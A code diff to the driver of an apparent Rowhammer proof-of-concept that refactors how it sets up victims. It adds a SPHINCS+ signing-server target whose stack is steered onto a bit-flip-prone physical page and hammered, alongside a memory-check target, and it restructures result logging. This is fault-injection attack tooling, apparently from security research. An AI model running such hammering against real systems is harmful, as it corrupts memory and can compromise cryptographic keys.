@@ -13,7 +13,7 @@ use bs_poc::{
     hammerer::{make_hammer, HammerStrategy},
     memory::{find_flippy_page, BitFlip, DataPattern, Initializable, VictimMemory},
     util::PAGE_SHIFT,
-    victim::{stack_process::StackProcessHammerResult, HammerVictimError},
+    victim::{HammerVictimError, VictimResult},
 };
 use bs_poc::{
     allocator::{self, BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap, Pfn},
@@ -29,7 +29,7 @@ use bs_poc::{
     hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper},
     memory::PfnResolver,
 };
-use bs_poc::{hammerer::Hammering, victim::stack_process::InjectionConfig};
+use bs_poc::{hammerer::Hammering, victim::sphincs_plus::InjectionConfig};
 use bs_poc::{
     memory::{mem_configuration::MemConfiguration, GetConsecPfns},
     util::PAGE_SIZE,
@@ -39,7 +39,7 @@ use bs_poc::{
     retry,
     util::init_logging_with_progress,
 };
-use clap::Parser;
+use clap::{Parser, Subcommand};
 use indicatif::{MultiProgress, ProgressBar};
 use itertools::Itertools;
 use log::{info, warn};
@@ -79,10 +79,10 @@ struct CliArgs {
     /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
     /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
     /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
-    #[arg(long)]
+    #[arg(long, group = "repeat", conflicts_with = "timeout")]
     repeat: Option<Option<usize>>,
     /// The timeout in seconds for the hammering process. The default is `None`, causing the hammering process to run indefinitely.
-    #[arg(long)]
+    #[arg(long, group = "timeout", conflicts_with = "repeat")]
     timeout: Option<u64>,
     /// The number of rounds to profile for vulnerable addresses.
     /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
@@ -98,7 +98,14 @@ struct CliArgs {
     #[arg(long)]
     statistics: Option<String>,
     /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
-    target: Vec<String>,
+    #[command(subcommand)]
+    target: Target,
+}
+
+#[derive(Clone, Debug, Subcommand, Serialize)]
+enum Target {
+    SphincsPlus { binary: String },
+    MemCheck,
 }
 
 /// The type of allocation strategy to use.
@@ -261,7 +268,7 @@ fn hammer_profile(
                         "Profiling hammering round successful at attempt {}: {:?}",
                         result.attempt, result.victim_result
                     );
-                    result.victim_result
+                    result.victim_result.bit_flips()
                 }
                 Err(e) => {
                     warn!("Profiling hammering round not successful: {:?}", e);
@@ -306,6 +313,44 @@ fn filter_flips<'a>(
         .collect_vec()
 }
 
+#[derive(Serialize)]
+struct ExperimentData<T> {
+    date: String,
+    error: Option<String>,
+    hammer_results: Option<T>,
+    target_page: Option<usize>,
+    target_offset: Option<TargetOffset>,
+}
+impl<T> ExperimentData<T> {
+    fn error(msg: String) -> Self {
+        Self {
+            date: chrono::Local::now().to_rfc3339(),
+            error: Some(msg),
+            hammer_results: None,
+            target_page: None,
+            target_offset: None,
+        }
+    }
+    fn error_with_page(msg: String, target_page: usize, target_offset: TargetOffset) -> Self {
+        Self {
+            date: chrono::Local::now().to_rfc3339(),
+            error: Some(msg),
+            hammer_results: None,
+            target_page: Some(target_page),
+            target_offset: Some(target_offset),
+        }
+    }
+    fn results(results: T, target_page: usize, target_offset: TargetOffset) -> Self {
+        Self {
+            date: chrono::Local::now().to_rfc3339(),
+            error: None,
+            hammer_results: Some(results),
+            target_page: Some(target_page),
+            target_offset: Some(target_offset),
+        }
+    }
+}
+
 unsafe fn _main() -> anyhow::Result<()> {
     let progress = init_logging_with_progress()?;
 
@@ -343,44 +388,7 @@ unsafe fn _main() -> anyhow::Result<()> {
     }
     let mut stats = vec![];
 
-    #[derive(Serialize)]
-    struct ExperimentData<T> {
-        date: String,
-        error: Option<String>,
-        hammer_results: Option<T>,
-        target_page: Option<usize>,
-        target_offset: Option<TargetOffset>,
-    }
-    impl<T> ExperimentData<T> {
-        fn error(msg: String) -> Self {
-            Self {
-                date: chrono::Local::now().to_rfc3339(),
-                error: Some(msg),
-                hammer_results: None,
-                target_page: None,
-                target_offset: None,
-            }
-        }
-        fn error_with_page(msg: String, target_page: usize, target_offset: TargetOffset) -> Self {
-            Self {
-                date: chrono::Local::now().to_rfc3339(),
-                error: Some(msg),
-                hammer_results: None,
-                target_page: Some(target_page),
-                target_offset: Some(target_offset),
-            }
-        }
-        fn results(results: T, target_page: usize, target_offset: TargetOffset) -> Self {
-            Self {
-                date: chrono::Local::now().to_rfc3339(),
-                error: None,
-                hammer_results: Some(results),
-                target_page: Some(target_page),
-                target_offset: Some(target_offset),
-            }
-        }
-    }
-    let mut results: Vec<ExperimentData<StackProcessHammerResult>> = vec![];
+    let mut results: Vec<ExperimentData<VictimResult>> = vec![];
     'repeat: for _ in 0..repetitions {
         if let Some(timeout) = timeout {
             if std::time::Instant::now() - start > timeout {
@@ -553,133 +561,75 @@ unsafe fn _main() -> anyhow::Result<()> {
             }
         }
         memory.initialize(dpattern.clone());
-        let target_page = target_addr & !0xfff; // mask out the lowest 12 bits
-        let target_pfn = (target_addr as *const u8).pfn().expect("no pfn") >> PAGE_SHIFT;
 
-        // TODO change "args.target" to enum
-        let victim = if args.target.is_empty() {
-            None
-        } else {
-            let stack_offset = target_offset.stack_offset;
-            info!(
-                "Using address {:x} (phys {:x}) for injection at stack offset {}",
-                target_page, target_pfn, stack_offset
-            );
-            // refactor me. This is way too deep.
-            match victim::stack_process::StackProcess::new(
-                "/home/jb/sphincsplus/ref/test/server".to_string(),
-                "keys.txt".to_string(),
-                "sigs.txt".to_string(),
-                InjectionConfig {
-                    flippy_page: target_page as *mut libc::c_void,
-                    flippy_page_size: PAGE_SIZE,
-                    bait_count_after: bait_count_after
-                        .get(&stack_offset)
-                        .copied()
-                        .expect("unsupported stack offset"),
-                    bait_count_before: 0,
-                },
-            ) {
-                Ok(p) => {
-                    let flippy_page = find_flippy_page(target_pfn, p.pid());
-                    match flippy_page {
-                        Ok(Some(flippy_page)) => {
-                            info!("Flippy page found: {:?}", flippy_page);
-                            if flippy_page.region_offset != stack_offset {
-                                warn!(
-                                    "Flippy page offset mismatch: {} != {}",
-                                    flippy_page.region_offset, stack_offset
-                                );
-                                p.stop();
-                                results.push(ExperimentData::error_with_page(
-                                    format!(
-                                        "Flippy page offset mismatch: {} != {}",
-                                        flippy_page.region_offset, stack_offset
-                                    ),
-                                    target_addr,
-                                    target_offset.clone(),
-                                ));
-                                continue 'repeat;
-                            }
-                            Some(p)
-                        }
-                        Ok(None) => {
-                            warn!("Flippy page not found");
-                            p.stop();
-                            results
-                                .push(ExperimentData::error("Flippy page not found".to_string()));
-                            continue 'repeat;
-                        }
-                        Err(e) => {
-                            warn!("Error finding flippy page: {:?}", e);
-                            p.stop();
-                            results.push(ExperimentData::error(format!(
-                                "Error finding flippy page: {:?}",
-                                e
-                            )));
-                            continue 'repeat;
-                        }
-                    }
-                }
-                Err(e) => {
-                    warn!("Failed to create victim: {:?}", e);
-                    results.push(ExperimentData::error(format!(
-                        "Failed to create victim: {:?}",
-                        e
-                    )));
-                    continue 'repeat;
-                }
+        let target_page = target_addr & !0xfff; // mask out the lowest 12 bits
+
+        let injection_config = InjectionConfig {
+            flippy_page: target_page as *mut libc::c_void,
+            flippy_page_size: PAGE_SIZE,
+            bait_count_after: bait_count_after
+                .get(&target_offset.stack_offset)
+                .copied()
+                .expect("unsupported stack offset"),
+            bait_count_before: 0,
+        };
+        let mut victim = match make_victim(
+            args.target.clone(),
+            &memory,
+            dpattern.clone(),
+            target_addr,
+            target_offset.clone(),
+            injection_config,
+        ) {
+            Ok(victim) => victim,
+            Err(e) => {
+                results.push(e);
+                continue 'repeat;
             }
         };
-        match victim {
-            Some(mut victim) => {
-                let hammer = make_hammer(
-                    &args.hammerer,
-                    &pattern.pattern,
-                    &pattern.mapping,
-                    mem_config,
-                    block_size,
-                    &memory,
-                    args.attempts,
-                    false,
-                    None,
-                )?;
-                for _ in 0..100 {
-                    let result = hammer.hammer(&mut victim);
-                    match result {
-                        Ok(result) => {
-                            info!("Hammering successful: {:?}", result.victim_result);
-                            results.push(ExperimentData::results(
-                                result.victim_result,
-                                target_page,
-                                target_offset.clone(),
-                            ));
-                        }
-                        Err(HammerVictimError::NoFlips) => {
-                            warn!("No flips detected");
-                            results.push(ExperimentData::error_with_page(
-                                "No flips detected".to_string(),
-                                target_addr,
-                                target_offset.clone(),
-                            ));
-                        }
-                        Err(e) => {
-                            warn!("Hammering failed: {:?}", e);
-                            results.push(ExperimentData::error_with_page(
-                                format!("Hammering failed: {:?}", e),
-                                target_addr,
-                                target_offset.clone(),
-                            ));
-                            break;
-                        }
-                    }
+
+        let hammer = make_hammer(
+            &args.hammerer,
+            &pattern.pattern,
+            &pattern.mapping,
+            mem_config,
+            block_size,
+            &memory,
+            args.attempts,
+            false,
+            None,
+        )?;
+        for _ in 0..100 {
+            let result = hammer.hammer(&mut victim);
+            match result {
+                Ok(result) => {
+                    info!("Hammering successful: {:?}", result.victim_result);
+                    results.push(ExperimentData::results(
+                        result.victim_result,
+                        target_page,
+                        target_offset.clone(),
+                    ));
                 }
-                victim.stop();
-            }
-            None => {
-                warn!("No target specified.");
+                Err(HammerVictimError::NoFlips) => {
+                    warn!("No flips detected");
+                    results.push(ExperimentData::error_with_page(
+                        "No flips detected".to_string(),
+                        target_addr,
+                        target_offset.clone(),
+                    ));
+                }
+                Err(e) => {
+                    warn!("Hammering failed: {:?}", e);
+                    results.push(ExperimentData::error_with_page(
+                        format!("Hammering failed: {:?}", e),
+                        target_addr,
+                        target_offset.clone(),
+                    ));
+                    break;
+                }
             }
         }
+        victim.stop();
         memory.dealloc();
     }
     let now = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
@@ -691,13 +641,74 @@ unsafe fn _main() -> anyhow::Result<()> {
     #[derive(Serialize)]
     struct ExperimentResult {
         args: CliArgs,
-        results: Vec<ExperimentData<StackProcessHammerResult>>,
+        results: Vec<ExperimentData<VictimResult>>,
     }
     let res = ExperimentResult { args, results };
     let mut json_file = BufWriter::new(File::create(results_file)?);
     serde_json::to_writer_pretty(&mut json_file, &res)?;
     json_file.flush()?;
     Ok(())
+}
+
+#[allow(clippy::result_large_err)]
+fn make_victim(
+    target: Target,
+    memory: &dyn VictimMemory,
+    dpattern: DataPattern,
+    target_addr: usize,
+    target_offset: TargetOffset,
+    injection_config: InjectionConfig,
+) -> Result<Victim, ExperimentData<VictimResult>> {
+    match target {
+        Target::MemCheck => {
+            let victim = victim::MemCheck::new(memory, dpattern);
+            Ok(Victim::MemCheck(victim))
+        }
+        Target::SphincsPlus { binary } => {
+            let target_pfn = (target_addr as *const u8).pfn().expect("no pfn") >> PAGE_SHIFT;
+            let stack_offset = target_offset.stack_offset;
+            // refactor me. This is way too deep.
+            let victim = victim::SphincsPlus::new(binary, injection_config).map_err(|e| {
+                warn!("Failed to create victim: {:?}", e);
+                ExperimentData::error(format!("Failed to create victim: {:?}", e))
+            })?;
+            let flippy_page = find_flippy_page(target_pfn, victim.pid());
+            match flippy_page {
+                Ok(Some(flippy_page)) => {
+                    info!("Flippy page found: {:?}", flippy_page);
+                    if flippy_page.region_offset != stack_offset {
+                        warn!(
+                            "Flippy page offset mismatch: {} != {}",
+                            flippy_page.region_offset, stack_offset
+                        );
+                        victim.stop();
+                        return Err(ExperimentData::error_with_page(
+                            format!(
+                                "Flippy page offset mismatch: {} != {}",
+                                flippy_page.region_offset, stack_offset
+                            ),
+                            target_addr,
+                            target_offset.clone(),
+                        ));
+                    }
+                    return Ok(Victim::SphincsPlus(victim));
+                }
+                Ok(None) => {
+                    warn!("Flippy page not found");
+                    victim.stop();
+                    Err(ExperimentData::error("Flippy page not found".to_string()))
+                }
+                Err(e) => {
+                    warn!("Error finding flippy page: {:?}", e);
+                    victim.stop();
+                    Err(ExperimentData::error(format!(
+                        "Error finding flippy page: {:?}",
+                        e
+                    )))
+                }
+            }
+        }
+    }
 }
 
 fn reproduce_pattern<H: Hammering>(
@@ -713,13 +724,11 @@ fn reproduce_pattern<H: Hammering>(
         let result = hammer.hammer(&mut victim);
         match result {
             Ok(result) => {
-                if result.victim_result.is_empty() {
+                let flips = result.victim_result.bit_flips();
+                if flips.is_empty() {
                     warn!("Failed to reproduce pattern in run {}: no flips", i);
                 } else {
-                    info!(
-                        "Reproduced pattern in run {}: {:?}",
-                        i, result.victim_result
-                    );
+                    info!("Reproduced pattern in run {}: {:?}", i, flips);
                     success += 1;
                 }
             }
@@ -729,6 +738,41 @@ fn reproduce_pattern<H: Hammering>(
         }
     }
     Ok(success)
+}
+
+enum Victim<'a> {
+    MemCheck(victim::MemCheck<'a>),
+    SphincsPlus(victim::SphincsPlus),
+}
+
+impl<'a> HammerVictim for Victim<'a> {
+    fn start(&mut self) {
+        match self {
+            Victim::MemCheck(v) => v.start(),
+            Victim::SphincsPlus(v) => v.start(),
+        }
+    }
+
+    fn init(&mut self) {
+        match self {
+            Victim::MemCheck(v) => v.init(),
+            Victim::SphincsPlus(v) => v.init(),
+        }
+    }
+
+    fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
+        match self {
+            Victim::MemCheck(v) => v.check(),
+            Victim::SphincsPlus(v) => v.check(),
+        }
+    }
+
+    fn stop(self) {
+        match self {
+            Victim::MemCheck(v) => v.stop(),
+            Victim::SphincsPlus(v) => v.stop(),
+        }
+    }
 }
 
 fn main() -> anyhow::Result<()> {
